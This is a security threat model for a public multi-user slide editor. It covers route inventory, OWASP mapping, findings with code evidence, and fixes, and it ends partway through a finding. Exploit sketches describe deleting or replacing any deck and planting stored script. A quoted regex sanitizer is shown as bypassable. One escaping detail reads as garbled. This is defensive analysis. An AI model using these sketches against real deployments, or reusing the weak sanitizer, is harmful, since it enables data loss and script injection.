# Security and rate limiting for a public multi user Turboslide

Report 04 of the Turboslide Google Slides parity round three, written 2026-09-13 against commit `61b16e4` (main after the round two production table). Round three adds live co-editing, presence, comments, share roles, optional accounts and background images to a studio that today lets anyone who loads the host read, write, trash and delete any deck. This report is the threat model for that public multi user editor and the hardening plan in priority order: every route and server function of `apps/studio`, the store, the renderer's escape block, the export and bundle paths, the Chromium that runs inside the Vercel function, the agent surface and its bearer, the dependency tree, and the rate limiting the platform and the application can provide.

Part A inventories the surface as deployed and read from the code. Part B is the threat model with the OWASP Top 10 2025 and OWASP API Security Top 10 2023 mapped to every surface. Part C lists the findings with evidence (file and line), severity, an exploit sketch and the fix. Part D covers rate limiting on Vercel. Part E is the hardening plan by area, and Part F the plan in priority order with the verification for each step. The report ends with the unverified claims and every source with its URL and the date read.

Rules followed: plain technical English, sentence case, no em dashes, no metaphors, no trailing periods on headings. No account was signed in and nothing was probed on the production deployment; every fact about Turboslide is read from the code at `61b16e4`, every fact about Vercel, OWASP, DOMPurify, sharp, Playwright and MCP from a public page read on 2026-09-13. `pnpm audit` was run read only against the committed lockfile. Where a claim could not be verified from a public source the text says so and the claim is repeated in section 12.

## How to read this report

- A file reference is `path:line` or `path:first-last` at commit `61b16e4`. Line numbers were read from the files on 2026-09-13.
- Severity is one of Critical (unauthenticated remote compromise of data, money or the function), High (unauthenticated loss of integrity or availability for other people, or a compromise that needs one more step), Medium (needs a victim action, a second weakness or a rare configuration), Low (defense in depth, information leaks, hygiene). The scale follows the impact on a deployment used by a sales team with prospects opening links, not a lab score.
- "Today" means the deployment as the code at `61b16e4` runs it on `turboslide.vercel.app` with `TURBOSLIDE_TOKEN` and `BLOB_READ_WRITE_TOKEN` set (docs/hosting.md section 6).
- F numbers are findings (section 6), R numbers are rate limit rules (section 7.4), P numbers are plan steps (section 9).

## 1. Summary

Five facts about the deployment today:

1. Every editor server function is open to anyone who can load the host. `writeDeck`, `saveVersion`, `leaseSlide`, `watchDeck`, `createNewDeck`, `renameStoredDeck`, `copyStoredDeck`, `trashStoredDeck`, `restoreStoredDeck`, `removeStoredDeck` (delete forever), `runDeckAction` (asset.add, slide.import and the collection actions), `renderSlideImages`, `warmThumbnails`, `syncExport`, `startBatchedExport`, `runBuild` and the two bundle ticket functions check the caller's browser origin (TanStack's CSRF middleware) and nothing else (`apps/studio/src/start.ts:12-19`, `apps/studio/src/server/write.ts:244-300`, `decks.ts:398-402`, `agent-actions.ts:74-126`). The bearer token gates only `/api/actions`, `/api/agent`, `/mcp`, `/api/export`, the full size `/api/render` and the bundle routes. The identity research of round one already recorded this (research/10 section B7); round three's identity and roles design is the fix for the whole class, and this report treats it as plan step P1.
2. The author of every write is a client supplied string (`?author=` on the editor, `author` in the write body, `x-turboslide-author` on the agent routes), so the version log, the leases and the coming activity and comments features cannot attribute anything (F2).
3. Two stored cross site scripting paths exist in the deck content itself: the `html` escape block, sanitized by five regular expressions that miss attribute separators other than whitespace, entity encoded `javascript:` schemes, `formaction` and `action`, and `@import` in its CSS (F4); and SVG assets, accepted by the bundle importer and by `asset.add` and served inline from the app origin at `/decks/<id>/assets/*.svg` (F5). Both run in the origin that will soon hold sessions.
4. Compute and storage are unmetered. A visitor can start an 800 second Chromium export, a whole deck render at 2x in both themes, a 200 MB bundle upload, an unlimited number of decks, and any number of thumbnail renders through the open `?w=` route, and the platform scales to 30,000 concurrent invocations billed by active CPU (F6, F7). There is no rate limit anywhere in the code (grep for `429`, `rate limit`, `ratelimit` over `apps/studio/src`, `packages/agent`, `packages/mcp`, `packages/store` finds nothing).
5. The Chromium that renders attacker controlled markup runs inside the function that holds `BLOB_READ_WRITE_TOKEN` and `TURBOSLIDE_TOKEN`, with `--no-sandbox`, `--single-process`, `--disable-web-security` and `--allow-running-insecure-content`, with unrestricted network egress, on a pinned Chromium 147 (F18), and the `sharp` in the same function is 0.35.0 with a high severity libheif heap overflow fixed in 0.35.4 (F17).

The ten items that matter most, in order (section 9 has the full plan):

1. P1 Identity and per deck authorization on every server function and route, with anonymous sessions first (a signed cookie is enough to attribute and to rate limit) and roles (owner, editor, commenter, viewer) checked on the server for every read and write. Everything below assumes it.
2. P2 Platform rate limits through Vercel WAF rules on `/_serverFn/*`, `/api/*`, `/mcp` and the auth routes, log first, then deny, with persistent deny on the sign in routes; application quotas per identity in Upstash Redis for renders, exports, uploads and storage.
3. P3 Dependency fixes: sharp to 0.35.4 with HEIF and AVIF loading blocked, `image-size` overridden past 2.0.2, Chromium moved to the current stable, `pnpm audit --prod --audit-level=high` as a `pnpm check` step.
4. P4 The `html` block rendered in a sandboxed `srcdoc` iframe in the studio and the viewer, sanitized with DOMPurify at write time and at render time, its CSS stripped of `@import` and `url()` outside `assets/`, refused in decks shared beyond the owner unless the owner turns it on; the standalone export keeps the same sanitizer and the PPTX export keeps rasterizing.
5. P5 SVG refused on hosted uploads (or rasterized through sharp), every uploaded image re-encoded through sharp after a magic byte check, HEIF and AVIF blocked, `Content-Disposition: attachment` and `nosniff` on every asset the app serves, assets moved to the Blob host or a separate origin.
6. P6 SSRF closed: `file` refused on hosted transports, `localhost` removed from the hosted allowlist, DNS resolved once and pinned through an undici Agent with private and link local ranges blocked, redirects handled manually and re-checked, a timeout on every outbound fetch, Chromium's network restricted to `file://` and the deck's own assets during renders.
7. P7 Security headers and a nonce based Content Security Policy from a TanStack request middleware, `frame-ancestors 'none'` everywhere but `/embed`, HSTS, `Referrer-Policy`, `Permissions-Policy`, `X-Content-Type-Options`.
8. P8 Chromium moved out of the secret holding function: a render function or the worker image with no Blob token, egress denied, the web security flags dropped, the binary current.
9. P9 The Blob store made private for documents, versions, leases, snapshots, exports and bundles (served through the function with authorization, or through signed URLs), public only for asset twins under random suffixed paths.
10. P10 Structured security logging (who, what deck, which action, from where, how much it cost) to a Drain, alerts on cost and on abuse patterns, and the agent bearer replaced by per agent tokens with scopes and revocation.

## 2. What was read and how

Code, all at `61b16e4`: `apps/studio/src/start.ts`, `router.tsx`, `routes/__root.tsx`, `routes/api/{actions.$action,agent,download.$token,export.$deckId,render.$slideId,decks.$deckId.bundle,decks.bundle}.ts`, `routes/mcp.ts`, `routes/decks.$deckId.assets.$.ts`, `routes/edit.$deckId.tsx` (the author and `runDeckAction` sections), `server/{auth,tokens,sessions,actions,agent-actions,export-sync,export-batch,download,bundle,bundle-core,root,write,thumbs,render,decks,json,warm,lint,measure,health,contracts}.ts`, `components/useStudioSession.ts`, `apps/studio/vite.deploy.config.ts`, `apps/studio/vercel.json`, `apps/studio/package.json`; `packages/agent/src/http/{auth,errors,dispatch,readers,sessions}.ts`; `packages/mcp/src/http.ts` and the `readImage` wiring of `server.ts`; `packages/store/src/{blob-vercel,blob-store,hosted,lease,watch,zip,unpack,bundle,templates,file-store,select,snapshots}.ts`; `packages/render/src/{html,text,slide,standalone,runtime}.ts` and `blocks/{html-escape,context}.ts`; `packages/headless/src/{launch,document,context}.ts` and `capture/{shared,intake,page}.ts`; `packages/materials/src/{actions,capture}.ts`; `packages/effects/src/io.ts`; `packages/schema/src/{ids,text,blocks,assets,mutations,actions}.ts` (the relevant schemas); `apps/render-worker/src/{cli,queue,client}.ts` and `jobs/render.ts`; `apps/cli/src/commands/{asset,build}.ts` and `hosts.ts`; `pnpm-workspace.yaml`; `.gitignore`. Documents: `AGENTS.md`, `docs/hosting.md`, `docs/hosting-chromium.md`, `docs/deck-transfer.md`, `docs/spec/SPEC.md` section 11, `docs/gslides-parity/research/10-identity-sharing-and-presence.md`. Installed packages, read for exact behaviour: `@modelcontextprotocol/sdk` 1.30.0 `webStandardStreamableHttp.d.ts`, `@tanstack/start-server-core` 1.169.32 `createStartHandler.js`.

Method: static reading of every request path from the route or server function down to the store, the worker or the file system; a search for every place that emits HTML, reads a URL, reads a path, spawns a process, or launches Chromium; `pnpm audit --json` on the committed lockfile; public documentation for the platform facts. Nothing was executed against production, no server was started, no dependency was installed. A grep for committed secrets (`vercel_blob_rw_`, `TURBOSLIDE_TOKEN=<hex>`, common key prefixes) over the tree and `git log -S` found nothing; `.env` and `.vercel/` are ignored (`.gitignore:13,18`).

## 3. The surface as deployed

### 3.1 Actors

- A visitor: anyone with the URL, a prospect who received a `/deck/<id>` link, a crawler, an attacker. Has a browser, so has every server function.
- A team member: today indistinguishable from a visitor; after P1 an identity with roles on decks.
- An agent: a CLI, an MCP client or a script holding `TURBOSLIDE_TOKEN`; today one shared static token for every agent (`packages/agent/src/http/auth.ts:75-95`).
- A local developer: the checkout with `pnpm dev` on `localhost:4321`, where the agent surface is open without a token to any request whose `Host` or `X-Forwarded-Host` reads as localhost (`auth.ts:88`).
- The platform: Vercel's CDN and functions, the public Blob store `turboslide-decks`, Chromium inside the function, sharp inside the function.
- Deck content as an actor: a deck is data written by any of the above and rendered for all of the others, in the browser and in the function's Chromium.

### 3.2 Assets

- Decks: `deck.json`, `slides/*.json`, `versions/<n>.json` (the whole undo log with inverse mutations), `leases.json`, `snapshots/*`, the asset twins under `assets/`. Speaker notes travel in slides and in exports with `includeNotes`.
- The GT brand deck and its licensed photographs (SPEC 11 says they move to a private overlay if the repo stays public; today they are the seed of every deployment).
- Secrets in the function environment: `TURBOSLIDE_TOKEN`, `BLOB_READ_WRITE_TOKEN`, optionally `TURBOSLIDE_DOWNLOAD_SECRET`; the Vercel OIDC token.
- Compute budget: active CPU on fluid compute, function memory time, Blob operations and transfer (docs/hosting.md section 4 "Costs" counts about 290 Blob puts per GT deck copy).
- Availability of the host for the sales team and the prospects on a call.
- From round three: sessions, comments, presence, share links, avatars and display names.

### 3.3 Route and function inventory

| Surface                       | Method and path                                                                                                                                                                                                         | Authentication today                          | What a caller gets or does                                                                                            | Cost class                                                          |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| Home, decks, trash            | `GET /`, `/new`, `/decks`, `/decks/trash`                                                                                                                                                                               | none                                          | lists every deck (title, id, revision, stamps), Connect card with push and pull commands                              | Blob `list` and a sync of every deck per visit (`HostedDecks.list`) |
| Editor                        | `GET /edit/:id?author=<any>`                                                                                                                                                                                            | none                                          | the full document, versions, leases; edits as any author name                                                         | reads                                                               |
| Viewer, embed, present, print | `GET /deck/:id`, `/embed/:id`, `/present/:id`, `/print/:id`                                                                                                                                                             | none                                          | the rendered deck; notes only when `/present` or `/print` ask                                                         | one render per slide on the server                                  |
| Assets                        | `GET /decks/:id/assets/*`                                                                                                                                                                                               | none                                          | asset twins including `.svg` served `image/svg+xml` inline, `.json` recipes                                           | file read or 302 to Blob                                            |
| Editor store functions        | `POST /_serverFn/*`: `writeDeck`, `saveVersion`, `listVersions`, `leaseSlide`, `watchDeck`, `readEditorDeck`, `readDraftDeck`                                                                                           | CSRF middleware only (browser origin)         | any write to any deck as any author; version save; leases; 25 s long poll                                             | Blob puts per write, one function invocation per poll               |
| Collection functions          | `createNewDeck`, `renameStoredDeck`, `copyStoredDeck`, `trashStoredDeck`, `restoreStoredDeck`, `removeStoredDeck`, `deckDetails`, `readSourceDeckSlides`, `listDecks`, `listTrashedDecks`, `getHostingFacts`, `getDeck` | CSRF only                                     | create unlimited decks, copy the 85 slide GT deck (about 290 Blob puts), delete any deck forever                      | Blob writes, deletes                                                |
| Server side window actions    | `runDeckAction` with `asset.add`, `asset.dither`, `material.capture`, `material.list`, `deck.list`, `deck.copy`, `deck.trash`, `deck.restore`, `deck.remove`, `slide.import`                                            | CSRF only; author from the client             | `asset.add` with a server path or a URL fetch; a shader capture in Chromium; deletes                                  | sharp, Chromium, Blob                                               |
| Studio sessions               | `attachStudioSession`, `pollStudioSession`, `answerStudioSession`, `detachStudioSession`                                                                                                                                | CSRF only                                     | attach a fake page for any deck; receive the commands agents issue to that deck                                       | memory per instance                                                 |
| Renders                       | `renderSlideImages`, `warmThumbnails`, `lintSlides`, the canvas measurers behind writes                                                                                                                                 | CSRF only                                     | whole deck renders at 1x or 2x, both themes, 300 s jobs                                                               | Chromium per slide                                                  |
| Exports                       | `exportCapabilities`, `startExport`, `syncExport`, `startBatchedExport`, `exportBatch`, `mergeExport`, `cancelBatchedExport`, `pollExport`, `signDownload`, `runBuild`                                                  | CSRF only                                     | a 780 s synchronous PPTX or PDF export, a 600 s standalone build, stored public copies                                | Chromium, up to 3009 MB and 800 s per call                          |
| Bundle tickets                | `bundleDownloadTicket`, `bundleUploadTicket`, `connectFacts`                                                                                                                                                            | CSRF only                                     | tickets that open the bundle routes for ten minutes without the bearer                                                | none                                                                |
| Agent actions                 | `GET/POST/PUT/DELETE /api/actions/:action?deck=&author=&force=`                                                                                                                                                         | bearer, or localhost without a token          | about a hundred actions, 1 MB bodies, 25 MB for `asset.add` and `asset.capture`                                       | varies                                                              |
| Manifest                      | `GET /api/agent`                                                                                                                                                                                                        | bearer                                        | the action table plus the attached pages (their URLs and states)                                                      | none                                                                |
| MCP                           | `GET/POST/DELETE /mcp`                                                                                                                                                                                                  | bearer                                        | one server per session, sessions kept 30 min idle in memory                                                           | memory, plus the actions                                            |
| Export route                  | `POST/GET /api/export/:id`                                                                                                                                                                                              | bearer; `?cancel=` needs none                 | the same exports over HTTP; job files                                                                                 | as above                                                            |
| Render route                  | `GET /api/render/:slideId?deck=&theme=&scale=&w=`                                                                                                                                                                       | bearer for full size; none with `?w=`         | thumbnails at three widths and two themes for any deck and slide, rendered on a cache miss                            | Chromium per miss                                                   |
| Download                      | `GET /api/download/:token`                                                                                                                                                                                              | HMAC one time token, 15 min                   | one produced file                                                                                                     | file read                                                           |
| Bundles                       | `GET /api/decks/:id/bundle`, `POST /api/decks/bundle`                                                                                                                                                                   | bearer or a ticket                            | any deck as a zip; create or replace any deck from a 200 MB zip or from a Blob URL                                    | zip inflate up to 400 MB in memory, 290 puts                        |
| Contracts                     | `GET /openapi.json`, `/llms.txt`, `/llms-full.txt`                                                                                                                                                                      | none                                          | the committed generated files                                                                                         | none                                                                |
| Blob host                     | `GET https://<store-id>.public.blob.vercel-storage.com/decks/<id>/...`, `exports/...`, `bundles/...`                                                                                                                    | none (public store, `addRandomSuffix: false`) | every document, version, lease file, snapshot, export and bundle by predictable path once the store hostname is known | Blob transfer                                                       |

The CSRF middleware is real and applies to every server function: `createCsrfMiddleware({ filter: (ctx) => ctx.handlerType === 'serverFn' })` (`start.ts:14-16`); TanStack's documentation states the middleware checks `Sec-Fetch-Site`, `Origin` and `Referer` and rejects requests without any of them (source S12). So a server function cannot be called from `curl` without headers or from another site, but it can be called by any script running on a page of the deployment's origin, which is exactly what the stored XSS findings (F4, F5) give an attacker, and by any visitor's own browser, which is what the missing authorization (F1) gives everyone.

### 3.4 Trust boundaries, as the code draws them

1. Browser to function: CSRF headers for server functions; nothing for pages and open routes; the bearer for the agent routes.
2. Function to Blob: a static read write token with public read for the world.
3. Function to Chromium: none. The renderer writes the document to `/tmp` and loads it as `file://` (`packages/headless/src/document.ts:71-84`); Chromium runs in the function's process tree with the function's environment and unrestricted egress.
4. Function to sharp: none. Bytes from a URL, a data URL, a server path or a bundle go to `sharp(...).metadata()` and the decoders before any format check (`capture/shared.ts:157-166`); the bundle path sniffs magic bytes first (`store/bundle.ts:184-222`), the intake path does not.
5. Deck content to every browser that renders it: `dangerouslySetInnerHTML` in the viewer, the editor, the filmstrip clone, print and present (`packages/viewer/src/SlideView.tsx:65,73`, `LiveClone.tsx:69`, `Editor.tsx:4012`, `apps/studio/src/routes/print.$deckId.tsx:313`) with the renderer's escaping as the only filter.

## 4. Threat model

### 4.1 Threats by surface

| #   | Threat                                                                              | Surface                                                              | Actor                                              | Today                                                                                                             | Severity                                          | OWASP 2025                                                      | API 2023   | Finding     |
| --- | ----------------------------------------------------------------------------------- | -------------------------------------------------------------------- | -------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- | ------------------------------------------------- | --------------------------------------------------------------- | ---------- | ----------- |
| T1  | Read, edit, trash or delete forever any deck                                        | every editor server function, `/decks`                               | visitor                                            | possible with a browser                                                                                           | Critical                                          | A01 Broken Access Control                                       | API1, API5 | F1          |
| T2  | Impersonate any author in versions, leases, comments                                | `?author=`, write body, `x-turboslide-author`                        | visitor, agent                                     | possible                                                                                                          | High                                              | A07 Authentication Failures                                     | API2       | F2          |
| T3  | Stored script in a deck runs for every viewer and editor                            | `html` block, run and block links                                    | anyone who can write a deck (everyone)             | regex sanitizer with bypasses                                                                                     | High (Critical once sessions exist)               | A05 Injection                                                   | API3       | F4          |
| T4  | Stored script through an uploaded SVG                                               | bundle import, `asset.add`, `/decks/:id/assets/*.svg`                | visitor                                            | possible                                                                                                          | High                                              | A05 Injection                                                   | API8       | F5          |
| T5  | Server reads local files or fetches internal addresses                              | `asset.add` `file` and `url`, `asset.capture`, Chromium subresources | visitor (asset.add through `runDeckAction`), agent | `file` accepts absolute paths, `localhost` allowlisted, redirects followed, no DNS pinning, Chromium unrestricted | High                                              | A01, A02 (SSRF is under Broken Access Control in the 2025 list) | API7       | F3, F18     |
| T6  | Unmetered Chromium, sharp and Blob work drives cost and availability                | renders, exports, builds, thumbnails, copies, uploads                | visitor                                            | no limits                                                                                                         | High                                              | A02 Security Misconfiguration                                   | API4, API6 | F6, F7      |
| T7  | Every document readable from the Blob host without the app                          | public store, predictable paths                                      | anyone who knows the store hostname                | possible                                                                                                          | High after P1 (today everything is public anyway) | A01, A04 Cryptographic Failures (no confidentiality)            | API1       | F8          |
| T8  | Compromise of the function through Chromium or sharp with untrusted input           | render and export jobs, `asset.add`                                  | anyone who can write a deck                        | old Chromium 147, no sandbox, single process; sharp 0.35.0 libheif overflow                                       | High                                              | A03 Software Supply Chain Failures, A02                         | API8       | F17, F18    |
| T9  | Cross site writes against a developer's local studio                                | `localhost` mode of `/api/actions`, `/mcp`                           | a web page the developer visits                    | JSON parsed from any content type, no Origin check                                                                | Medium                                            | A01                                                             | API2       | F13         |
| T10 | Hijack of agent view commands and manifest pollution                                | studio sessions                                                      | visitor                                            | attach a fake page                                                                                                | Low                                               | A01                                                             | API5       | F14         |
| T11 | Clickjacking of the editor, referrer leaks, script injection unmitigated by headers | every page                                                           | attacker site                                      | no CSP, no frame ancestors rule, no HSTS in code                                                                  | Medium                                            | A02                                                             | API8       | F15         |
| T12 | Memory exhaustion by bundle or session floods                                       | `/api/decks/bundle`, MCP and studio sessions                         | visitor (with a ticket), agent                     | 400 MB inflate in memory; unbounded maps                                                                          | Medium                                            | A10 Mishandling of Exceptional Conditions                       | API4       | F16, F14    |
| T13 | Brute force and credential stuffing once sign in exists                             | the future auth routes                                               | attacker                                           | not built yet                                                                                                     | High if built without limits                      | A07                                                             | API2       | section 8.1 |
| T14 | Nobody notices any of the above                                                     | logs                                                                 | all                                                | one log line behind an env flag, one day retention on Pro                                                         | Medium                                            | A09 Security Logging and Alerting Failures                      | API9       | F20         |
| T15 | The shared bearer leaks and cannot be rotated per agent                             | agent routes, `~/.config/turboslide/hosts.json`                      | attacker with the token                            | one token for everything                                                                                          | Medium                                            | A07                                                             | API2       | F12         |
| T16 | Speaker notes and hidden slides leave through exports and print                     | `syncExport` with `includeNotes`, `/print`                           | visitor                                            | possible                                                                                                          | Medium                                            | A01                                                             | API3       | F21         |
| T17 | Information leaks in errors and headers                                             | render and export routes, `x-turboslide-record`                      | visitor                                            | server paths and internal messages returned                                                                       | Low                                               | A02                                                             | API8       | F10         |
| T18 | Host header confusion opens the agent surface behind a proxy                        | `X-Forwarded-Host` trust                                             | attacker                                           | safe on Vercel (the platform sets the header); unsafe on `node-server` behind a proxy without a token             | Low                                               | A02                                                             | API8       | F11         |

### 4.2 OWASP Top 10 2025 mapped to Turboslide

The 2025 list (source S16) is A01 Broken Access Control, A02 Security Misconfiguration, A03 Software Supply Chain Failures, A04 Cryptographic Failures, A05 Injection, A06 Insecure Design, A07 Authentication Failures, A08 Software or Data Integrity Failures, A09 Security Logging and Alerting Failures, A10 Mishandling of Exceptional Conditions.

- A01 Broken Access Control: the dominant category. No authorization exists on any deck operation (F1); SSRF is filed here in 2025 (F3); the public Blob store exposes every document (F8); the local agent surface accepts cross site writes (F13).
- A02 Security Misconfiguration: no security headers or CSP (F15); Chromium flags and a public store by default (F18, F8); `localhost` in the hosted allowlist (F3); error bodies with paths (F10); `0.0.0.0` treated as localhost (F11).
- A03 Software Supply Chain Failures: sharp 0.35.0, image-size 1.2.1 through pptxgenjs, Chromium 147 pinned, a beta Nitro, no audit gate (F17).
- A04 Cryptographic Failures: the HMAC tickets and download tokens are sound (SHA-256, `timingSafeEqual`, expiry); the weaknesses are elsewhere: a per process random signing key when `TURBOSLIDE_DOWNLOAD_SECRET` is unset (functional, F19), draft ids from `Math.random` (F22), and documents at rest readable by anyone through the public store (F8).
- A05 Injection: stored XSS through the `html` block and SVG (F4, F5); CSS injection through `@import` and `url()` (F4); the future comments and display names must never reach `innerHTML`.
- A06 Insecure Design: the round one design deferred identity to "open question 3" and shipped a shared token and self declared authors; round three must put authorization on the store boundary, not on the page.
- A07 Authentication Failures: author spoofing (F2); one shared bearer without scopes or rotation (F12); the coming sign in without brute force limits (section 8.1).
- A08 Software or Data Integrity Failures: versions and leases attribute to unverified names (F2); a bundle can carry a fabricated version log and lease file (F16); exports stored at public URLs can be fetched by anyone who guesses a job id (F8, F9).
- A09 Security Logging and Alerting Failures: no security log, no request id, no alerting (F20).
- A10 Mishandling of Exceptional Conditions: bundle inflation in memory and unbounded session maps (F16, F14); the disk full path is handled well (`root.ts:391-427`).

### 4.3 OWASP API Security Top 10 2023 mapped to the agent surface and the server functions

The 2023 list (source S17): API1 Broken Object Level Authorization, API2 Broken Authentication, API3 Broken Object Property Level Authorization, API4 Unrestricted Resource Consumption, API5 Broken Function Level Authorization, API6 Unrestricted Access to Sensitive Business Flows, API7 Server Side Request Forgery, API8 Security Misconfiguration, API9 Improper Inventory Management, API10 Unsafe Consumption of APIs.

- API1 and API5: every deck id is an object id anyone may act on, and `deck.remove`, `deck.trash`, `slide.import` and `asset.add` are function level operations open to everyone through `runDeckAction` (F1).
- API2: the shared bearer and the client chosen author (F2, F12); the local mode's trust in `Host` (F11, F13).
- API3: speaker notes and skipped slides are properties a viewer should not read; `syncExport` with `includeNotes: true` and `/print` return them (F21).
- API4: no limits on renders, exports, uploads, decks, versions, sessions (F6, F7, F14, F16).
- API6: export and copy are the business flows a competitor or a bot would abuse for cost (F6).
- API7: `asset.add` `url`, `asset.capture`, `{ url }` bundle uploads (allowlisted to the Blob host with redirects refused, the one careful path), Chromium subresources (F3, F18).
- API8: headers, flags, public store, error bodies (F15, F18, F8, F10).
- API9: the manifest at `/api/agent` and `/openapi.json` inventory the surface well; the server functions are not inventoried anywhere and are the larger attack surface. Section 3.3 is that inventory and should move into the docs.
- API10: `asset.add` trusts the allowlisted hosts' responses (any bytes into sharp), and the MCP `readImage` reads whatever path a resource resolves to (F23).

## 5. What is already done well

The report records these so the plan does not redo them.

- Input validation on every transport goes through the same Zod schemas with `strictObject` and `unknown_field` refusals (`packages/agent/src/http/dispatch.ts:119-190`); ids are slugs (`packages/schema/src/ids.ts:13`); body caps of 1 MB and 25 MB are enforced against `content-length` and the read text (`dispatch.ts:56-86`).
- The download tokens are HMAC-SHA256 with `timingSafeEqual`, a nonce spent once, a 15 minute expiry, and the path is derived from the job report, never from the token (`tokens.ts:91-109,159-190`). The bundle tickets follow the same pattern (`bundle-core.ts:81-120`).
- The bearer comparison is constant time (`auth.ts:61-65`); a deployment without a token refuses every request off localhost instead of serving open (`auth.ts:89-94`).
- The zip reader refuses zip64, checks every size and CRC, refuses unsafe entry names, caps inflation at twice the bundle limit, and the unpacker validates every digest and the whole document before writing to a staging folder renamed into place (`store/zip.ts:157-247`, `store/unpack.ts:72-150,208-270`).
- The `{ url }` bundle fetch is allowlisted to the Blob host, refuses redirects and times out at 120 s (`bundle-core.ts:258-306`). This is the model the asset fetch should follow.
- Asset paths are confined to the deck's `assets/` folder by `assetPathWithin` (`store/hosted.ts:130-134`) and by the schema refinement on twin paths (`schema/assets.ts:121-123`).
- Child processes are spawned with argument arrays, never a shell (`render-worker/src/cli.ts:100-135`); caller supplied output names are reduced to a base name and a safe character set (`actions.ts:256,275`).
- The CSRF middleware is declared and filtered explicitly (`start.ts`).
- Derived files on the function's `/tmp` are swept on a budget with a grace period, and ENOSPC is retried once then answered as a 503 (`root.ts:391-795`).
- The exporter's HTML notes script escapes `<` as `<` (`render/standalone.ts:141-151`), and `escapeText` and `escapeAttr` cover the characters that matter in text and double quoted attributes (`render/html.ts:7-18`).
- The CLI stores the bearer at mode 0600 under a 0700 folder and never prints it (`apps/cli/src/hosts.ts:73-87`).
- Speaker notes leave the public viewer and embed payloads (`decks.ts:104-110,514-519`).

## 6. Findings

Grouped by theme. Severity as defined in "How to read this report".

### 6.1 Access control and identity

**F1 Every deck operation is open to every visitor. Critical.**

Evidence: `apps/studio/src/start.ts:12-19` (CSRF only, filtered to server functions); `server/write.ts:244-300` (`writeDeckFn` takes `deckId`, `write`, `force` and applies it); `server/decks.ts:398-402` (`removeDeckFn` deletes the folder or the Blob prefix), `:372-376` (trash), `:328-357` (copy), `:257-271` (create); `server/agent-actions.ts:39-50,74-126` (`runDeckActionFn` runs `asset.add`, `deck.remove`, `slide.import` and the rest with a client supplied author); `server/bundle.ts:48-53` (`bundleUploadTicketFn` takes no input and mints a ticket for any upload); `routes/api/decks.bundle.ts:121-147` (`?as=<id>&replace=1` replaces any deck with a ticket); `server/download.ts:151-158` (`syncExportFn`); `server/render.ts:67-121`. The identity research recorded the same (research/10 B7, B11).

Exploit sketch: open `turboslide.vercel.app/decks`, pick any deck id, run in the console the same server function call the trash page makes with `deckId` set to that id and `baseRevision` omitted; the deck is gone for everyone. Or `writeDeck` with a `slide.replace` mutation that puts an `html` block on the title slide of a deck a prospect will open (see F4). Or `bundleUploadTicket()` then `POST /api/decks/bundle?t=<ticket>&as=gt-brand&replace=1` with a crafted bundle.

Fix: P1. A session for every browser (anonymous first: a signed `__Host-ts_session` cookie with a random id, a display name and an avatar seed; sign in adds a verified identity to the same session); a deck ownership record (owner id, sharing mode, role grants) in the store beside `deck.json`; a server side `authorize(session, deckId, capability)` call at the top of every server function and every route, with capabilities read, comment, write, share, delete; the collection list filtered to what the session may see; the agent bearer mapped to an agent identity with the same checks. Roles per SPEC-3: viewer, commenter, editor, owner; link sharing modes: restricted, anyone with the link can view or comment or edit. Refuse `force` and `deck.remove` to non owners. Until P1 lands, an interim measure that costs an afternoon: Vercel Deployment Protection with "All Deployments" and Vercel Authentication (Pro, source S1) puts the whole host behind Vercel accounts; it blocks prospects too, so it is a stopgap for a private pilot, not the product.

**F2 The author is a client supplied string. High.**

Evidence: `apps/studio/src/routes/edit.$deckId.tsx:291-292` (`DEFAULT_AUTHOR = 'studio'`), `:350` (`?author=` accepted as any non empty string), `:387` (`parseAuthor(search.author ?? DEFAULT_AUTHOR)`); `server/write.ts:73-77` (`parseAuthor` from the body); `server/agent-actions.ts:94-95` (author from the body); `packages/agent/src/http/auth.ts:108-113` (`x-turboslide-author` or `?author=`); `packages/schema/src/mutations.ts:159-163` (`authorSchema`: any `name`).

Exploit sketch: `/edit/<id>?author=kevin`, then any edit; the version panel and the coming activity feed read "kevin". A leased slide can be taken over by choosing the holder's name, since `sameAuthor` compares labels (`packages/store/src/store.ts:126-134`; research/10 B2).

Fix: the server derives `Author` from the session (id, display name, kind human) or from the agent token (kind agent, the token's registered name, `runId` from the header). The body's `author` field is ignored on the server or refused as `unknown_field` on the browser transports; the CLI keeps `--author` for the local file store only. Leases and presence key on the identity id, not the label.

**F21 Speaker notes and skipped slides reach viewers through exports and print. Medium.**

Evidence: `server/download.ts:96-114,151-158` (`syncExport` accepts `includeNotes` and `includeSkipped` from any caller); `routes/api/export.$deckId.ts:343-353`; `server/decks.ts:501-513` (`/print` and `/present` ask for notes). The viewer and embed payloads correctly omit them (`decks.ts:514-519`).

Fix: with P1, notes and skipped slides are properties of the editor and commenter roles; the export and print paths check the role before honouring `includeNotes` and `includeSkipped`.

**F22 Deck ids are guessable and are the only capability a share link carries. Low today, Medium after P1.**

Evidence: `server/root.ts:343-351` (`newDraftDeckId` from `Math.random`, 36^4 suffixes per day); `packages/store/src/templates.ts:186-188` (`deckIdFor` slugifies the title). Today `/decks` lists everything, so guessing adds nothing; after P1 the link is the credential for "anyone with the link".

Fix: share links carry a separate random token (at least 128 bits, `crypto.getRandomValues`) stored with the deck's sharing record, revocable, with the mode (view, comment, edit) bound into the token; the deck id stays a slug for the CLI and the URL. Draft ids from `crypto` as well.

### 6.2 Injection and content

**F4 Stored cross site scripting and CSS injection through the `html` escape block. High today, Critical once sessions exist.**

Evidence: `packages/render/src/blocks/html-escape.ts:16-23`:

```ts
export function sanitizeHtml(html: string): string {
  return html
    .replace(/<script\b[\s\S]*?<\/script\s*>/gi, '')
    .replace(/<(iframe|object|embed)\b[\s\S]*?(<\/\1\s*>|\/>)/gi, '')
    .replace(/<(iframe|object|embed)\b[^>]*>/gi, '')
    .replace(/\s+on[a-z]+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '')
    .replace(/\s+(href|src|xlink:href)\s*=\s*(["']?)\s*javascript:[^"'\s>]*\2/gi, '');
}
```

